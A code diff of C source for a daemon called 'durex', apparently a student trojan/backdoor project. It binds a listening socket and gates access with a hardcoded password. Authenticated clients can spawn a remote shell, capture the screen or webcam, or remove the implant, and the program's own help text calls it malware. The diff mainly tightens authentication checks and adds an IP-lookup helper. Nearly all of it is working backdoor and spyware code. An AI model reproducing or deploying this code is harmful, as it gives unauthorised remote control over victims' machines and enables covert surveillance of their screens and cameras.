@@ -1,6 +1,5 @@
 #include "durex.h"
 
-
 bool	setup_deamon(t_connexion *connexion, uint16_t port)
 {
 	umask(0);
@@ -18,7 +17,7 @@ bool	setup_deamon(t_connexion *connexion, uint16_t port)
 	}
 
 	if ( setsockopt(connexion->master_socket, SOL_SOCKET, SO_REUSEADDR,
-		(char *)&connexion->opt, sizeof(connexion->opt)) < 0)
+				(char *)&connexion->opt, sizeof(connexion->opt)) < 0)
 	{
 		perror("setsockopt()");
 		return (false); 
@@ -29,12 +28,26 @@ bool	setup_deamon(t_connexion *connexion, uint16_t port)
 	connexion->address.sin_port = htons(port);
 
 	if (bind(connexion->master_socket, (struct sockaddr *)&connexion->address,
-		sizeof(connexion->address)) < 0)
+				sizeof(connexion->address)) < 0)
 	{
 		perror("bind()");
 		return (false);
 	}
 	return (true);
+}
+
+static char	*get_ip()
+{
+	int n;
+	struct ifreq ifr;
+	char array[] = "enp7s1";
+
+	n = socket(AF_INET, SOCK_DGRAM, 0);
+	ifr.ifr_addr.sa_family = AF_INET;
+	strncpy(ifr.ifr_name , array , IFNAMSIZ - 1);
+	ioctl(n, SIOCGIFADDR, &ifr);
+	close(n);
+	return (inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr));
 }
 
 void	create_daemon()
@@ -76,6 +89,7 @@ static bool	new_client(t_connexion *connexion, t_users *users)
 				if (connexion->client_socket[users->i] == 0 )
 				{
 					connexion->client_socket[users->i] = users->new_socket;
+					send(users->new_socket, "KEY: ", 5, 0);
 					break;
 				}
 			}
@@ -234,25 +248,25 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 		}
 		users.activity = select(users.max_sd + 1 , &users.readfds , NULL , NULL , NULL);
 		//if ((activity < 0) && (errno!=EINTR))
-			////printf("select error");
+		////printf("select error");
 		if (new_client(connexion, &users) == false)
 			return (false);
 		/*if (users.key[users.i] == false)*/
-			/*send(users.sd, "KEY: ", 5, 0);*/
+		/*send(users.sd, "KEY: ", 5, 0);*/
 		for (users.i = 0; users.i < MAX_CLIENT; users.i++)
 		{
 			users.sd = connexion->client_socket[users.i];
 			/*if (users.key[users.i] == false)*/
 			/*{*/
-				/*send(connexion->client_socket[users.i], "> ", 2, 0);*/
-				/*[>printf("Bonjour\n");<]*/
+			/*send(connexion->client_socket[users.i], "KEY ", 4, 0);*/
+			/*[>printf("Bonjour\n");<]*/
 			/*}*/
 			if (FD_ISSET(users.sd , &users.readfds))
 			{
-				/*if (users.key[users.i] == true)*/
+				/*if (users.key[users.i] == false)*/
 				/*{*/
-					/*send(connexion->client_socket[users.i], "> ", 2, 0);*/
-					/*printf("Bonjour\n");*/
+				/*send(connexion->client_socket[users.i], "> ", 2, 0);*/
+				/*printf("Bonjour\n");*/
 				/*}*/
 				if (users.key[users.i] == true)
 					send(users.sd, "> ", 2, 0);
@@ -272,10 +286,10 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						if (!strcmp(buffer, PSWD))
 						{
 							users.key[users.i] = true;
-							send(users.sd, "Connected\n> ", 12, 0);
+							send(users.sd, "Connected !\nType ? to print all command\n> ", 42, 0);
 						}
 						else
-							send(users.sd, "Please enter password\n> ", 22, 0);
+							send(users.sd, "KEY: ", 5, 0);
 					}
 					else
 					{
@@ -287,15 +301,15 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.key[users.i] = false;
 							users.nb_user--;
 						}
-						if (!strcmp(buffer, "remove"))
+						if (!strcmp(buffer, "remove") && users.key[users.i] == true)
 							remove_daemon(&users);
-						else if (!strcmp(buffer, "screen"))
-							screen(&users, envp, SCREEN);
-						else if (!strcmp(buffer, "cam"))
-							screen(&users, envp, CAM);
-						else if (!strcmp(buffer, "?"))
-							send(users.sd, "\r'shell'\t\tSpawn remote shell\n'quit'\t\tClose program\n'Remove'\tremove malware\n> ", 77, 0);
-						else if (!strcmp(buffer, "shell"))
+						else if (!strcmp(buffer, "screen") && users.key[users.i] == true)
+						screen(&users, envp, SCREEN);
+						else if (!strcmp(buffer, "cam") && users.key[users.i] == true)
+						screen(&users, envp, CAM);
+						else if (!strcmp(buffer, "?") && users.key[users.i] == true)
+							send(users.sd, "\r'shell'\t\tSpawn remote shell\n'quit'\t\tClose program\n'remove'\tremove malware\n> ", 77, 0);
+						else if (!strcmp(buffer, "shell") && users.key[users.i] == true)
 						{
 							spawn_shell(&users, envp);
 							close( users.sd );
@@ -303,7 +317,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.key[users.i] = false;
 							users.nb_user--;
 						}
-						else if (strlen(buffer))
+						else if (strlen(buffer) && users.key[users.i] == true)
 							send(users.sd, "\rCommand not found. Type ? for print all command\n> ", 51, 0);
 					}
 					memset(&buffer, 0, BUFFSIZE);
@@ -314,7 +328,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 				if (connexion->client_socket[j] != 0)
 					break;
 				/*else if (j == 2)*/
-					/*return (true);*/
+				/*return (true);*/
 			}
 		}
 	}
